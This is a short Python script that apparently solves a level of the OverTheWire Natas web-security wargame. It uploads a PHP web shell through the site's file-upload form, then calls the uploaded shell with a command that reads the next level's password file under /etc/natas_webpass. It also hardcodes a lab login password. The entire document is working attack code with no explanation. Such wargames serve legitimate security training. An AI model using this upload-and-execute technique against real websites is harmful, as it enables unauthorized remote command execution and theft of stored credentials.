#!usr/env/python3

import requests

username = 'natas13'
url = 'http://%s.natas.labs.overthewire.org/' % username
password = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'

session = requests.session()
#connection = session.get(url, auth = (username, password))
#connection = session.post(url, files = {"uploadedfile":open('shell.php', 'rb')}, data= {"filename":"shell.php"},auth = (username, password))
connection = session.post(url + "upload/4xiuhrnxwu.php?c=cat /etc/natas_webpass/natas14", files = {"uploadedfile":open('shell.php', 'rb')}, data= {"filename":"shell.php"},auth = (username, password))

print(connection.text)



# upload/4xiuhrnxwu.php